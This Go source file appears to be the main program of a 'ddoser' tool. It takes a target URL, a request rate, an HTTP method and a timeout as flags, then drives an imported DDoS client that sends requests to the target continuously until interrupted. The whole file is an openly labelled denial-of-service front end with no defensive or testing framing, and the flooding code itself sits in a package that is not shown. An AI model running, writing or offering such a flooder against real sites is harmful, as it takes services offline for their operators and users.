package main

import (
	"context"
	"flag"
	"fmt"
	"log"
	"net/http"
	"os"
	"os/signal"
	"time"

	"github.com/goodleby/ddoser/client/ddos"
)

func main() {
	ctx, cancel := signal.NotifyContext(context.Background(), os.Interrupt, os.Kill)
	defer cancel()

	flags, err := ReadFlags()
	if err != nil {
		log.Fatalf("Error reading flags: %v", err)
	}

	ddosClient, err := ddos.NewClient(flags.HTTPTimeout)
	if err != nil {
		log.Fatalf("Error creating ddos client: %v", err)
	}

	requestGenerator := NewRequestGenerator(flags.URL, flags.Method)

	go func() {
		err = ddosClient.DDoS(ctx, requestGenerator, flags.Rate)
		if err != nil {
			log.Printf("Error ddosing: %v", err)
			cancel()
		}
	}()

	<-ctx.Done()

	log.Println("Stopped ddosing")
}

// TODO: Allow for custom methods, body and headers
func NewRequestGenerator(url string, method string) ddos.RequestGenerator {
	return func(ctx context.Context) (*http.Request, error) {
		req, err := http.NewRequestWithContext(
			ctx,
			method,
			url,
			nil,
		)
		if err != nil {
			return nil, fmt.Errorf("error creating new request: %v", err)
		}

		return req, nil
	}
}

type Flags struct {
	URL         string
	Rate        int
	Method      string
	HTTPTimeout time.Duration
}

func (f *Flags) Validate() error {
	if f.URL == "" {
		return fmt.Errorf("missing required url flag")
	}
	if f.Rate == 0 {
		return fmt.Errorf("missing required rate flag")
	}

	return nil
}

func ReadFlags() (*Flags, error) {
	var flags Flags

	flag.StringVar(&flags.URL, "url", "", "Target URL to make requests to.")
	flag.IntVar(&flags.Rate, "rate", 0, "Amount of requests per second.")
	flag.StringVar(&flags.Method, "method", http.MethodGet, "HTTP method to use.")
	flag.DurationVar(&flags.HTTPTimeout, "http-timeout", 1*time.Second, "HTTP client timeout.")

	flag.Parse()

	err := flags.Validate()
	if err != nil {
		return nil, fmt.Errorf("error: invalid flags: %v", err)
	}

	return &flags, nil
}
